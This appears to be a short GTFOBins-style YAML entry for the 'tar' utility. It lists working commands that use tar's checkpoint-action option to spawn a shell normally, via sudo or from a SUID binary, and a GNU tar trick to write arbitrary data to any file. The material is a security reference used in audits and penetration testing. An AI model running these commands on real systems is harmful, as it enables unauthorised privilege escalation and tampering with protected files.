---
functions:
  execute-interactive:
    - code: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  sudo-enabled:
    - code: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  suid-limited:
    - code: ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  file-write:
    - description: This only works for GNU tar.
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo data > "$TF"
        tar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P
---
